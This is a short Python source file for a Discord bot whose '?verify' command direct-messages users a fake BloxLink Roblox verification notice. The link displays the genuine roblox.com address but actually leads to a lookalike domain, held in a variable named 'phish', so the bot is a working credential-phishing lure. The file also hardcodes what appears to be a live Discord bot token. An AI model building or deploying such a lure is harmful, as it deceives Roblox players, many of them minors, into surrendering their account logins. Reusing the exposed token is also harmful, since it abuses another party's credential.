import discord
from discord.ext import commands
import requests



token = "OTk3NTMwNzE1NjIzMjYwMzQw.G5M5Ff.Pm7ppB00pkCClrGyRvTs0jfrEc7AfjJZp7GFWs"
prefix = "?"
title = "Please Complete Verification"
desc ="To verify your account, please join BloxLink's Official Roblox Verification Game"
field = "Please Login and join the game"
hyperlink = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game"
phish = "https://roblox.uk.com/games/1271943503/Bloxlink-Verification-Game"





client = commands.Bot(command_prefix = prefix)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Bot Online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")


@client.command()
async def verify(ctx):
    await ctx.send('Sent verification info. Please check your DMs.')
    await ctx.author.send(embed=main)





client.run(token)